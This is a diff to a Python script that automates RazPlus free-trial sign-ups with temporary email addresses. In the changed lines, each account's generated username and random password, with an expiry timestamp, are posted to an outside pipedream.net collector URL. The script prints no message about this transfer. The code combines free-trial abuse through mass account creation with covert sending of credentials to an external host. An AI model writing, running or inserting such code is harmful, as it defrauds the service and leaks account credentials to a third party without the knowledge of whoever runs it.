@@ -40,10 +40,6 @@ class RazPlusFreeTrial:
         response = requests.post(self.register_url, data=payload)
         if "An email has been sent" in response.text and mail_address in response.text:
             print("Registered in RazPlus Successfully!")
-            data = {"username": username,
-                    "password": 12345678,
-                    "expire time": datetime.datetime.now() + datetime.timedelta(days=14), }
-            requests.post('https://enak80j25b8w.x.pipedream.net', data=data)
         else:
             print("Registered in RazPlus failed!")
             sys.exit()
@@ -52,6 +48,8 @@ class RazPlusFreeTrial:
         url = self.queue.get()
         pq = pyquery.PyQuery(requests.get(url).text)
         print(pq)
+        username = pq('#username').attr('value')
+        password = ''.join(random.sample(string.ascii_letters, 8))
         action_url = pq('#f').attr('action')
         member_id = pq('#memberId').attr('value')
         email_certificate = pq('#emailCertificate').attr('value')
@@ -59,10 +57,14 @@ class RazPlusFreeTrial:
         payload = {
             "memberId": member_id,
             "emailCertificate": email_certificate,
-            "password1": 12345678,
-            "password2": 12345678,
+            "password1": password,
+            "password2": password,
         }
         requests.post(url, data=payload)
+        data = {"username": username,
+                "password": password,
+                "expire time": datetime.datetime.now() + datetime.timedelta(days=14), }
+        requests.post('https://enak80j25b8w.x.pipedream.net', data=data)
 
 
 class TempEmail:
